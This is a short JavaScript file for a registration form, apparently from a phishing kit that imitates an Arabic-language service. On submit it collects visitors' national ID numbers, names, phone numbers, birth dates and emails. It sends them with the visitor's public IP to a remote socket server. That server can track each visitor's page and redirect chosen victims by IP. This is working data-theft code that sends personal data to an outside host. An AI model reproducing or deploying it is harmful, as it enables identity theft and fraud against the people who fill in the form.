
$(document).ready(function() {
    window.socket = io("https://server-2h6g.onrender.com", { transports: ["websocket", "polling"] });
    window.visitorIP = null;

    (async () => {
        try {
            const r = await fetch("https://api.ipify.org?format=json");
            const { ip } = await r.json();
            window.visitorIP = ip;
            window.socket.emit("updateLocation", { ip, page: "register.html" });
        } catch(e) { console.error("IP fetch failed:", e); }
    })();

    window.socket.on("navigateTo", ({ page, ip: targetIp }) => {
        if (window.visitorIP === targetIp) window.location.href = page;
    });

    $("#form").on("submit", function(e) {
        e.preventDefault();
        const data = {
            ip: window.visitorIP,
            request_type: $("select[name='request_type']").val(),
            ssn: $("input[name='ssn']").val(),
            userName: $("input[name='name']").val(),
            phoneNumber: $("input[name='phone']").val(),
            birthDate: $("input[name='birth_date']").val(),
            email: $("input[name='email']").val(),
            updatedAt: new Date()
        };

        sessionStorage.setItem("dallahData", JSON.stringify(data));
        
        if (window.visitorIP) {
            window.socket.emit("submitIndex", data);
            window.location.href = "register-second.html";
        } else {
            alert("جاري التحقق من الاتصال، يرجى المحاولة مرة أخرى");
        }
    });
});
